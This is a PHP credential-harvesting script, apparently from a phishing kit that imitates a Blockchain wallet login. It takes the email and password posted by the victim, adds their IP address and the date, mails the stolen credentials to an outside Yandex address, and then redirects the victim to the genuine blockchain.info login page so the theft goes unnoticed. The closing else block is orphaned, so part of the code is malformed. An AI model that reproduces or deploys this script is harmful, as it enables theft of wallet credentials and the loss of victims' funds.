<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "--------   BlockChain Logz  -----\n";
$message .= "Email: ".$_POST['blckmail']."\n";
$message .= "Password: ".$_POST['blckpass']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--------------------------------------\n";

$recipient = "maxgomery@yandex.com";
$subject = "Blockchain - Email";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
     mail("", "", $message);
if (mail($recipient, $subject, $message, $headers)) {
}
?>
    
           <script language=javascript>
window.location='https://blockchain.info/wallet/#/login/';
</script>
<?

       }
else
           {
        echo "ERROR! Please go back and try again.";
       }

?>
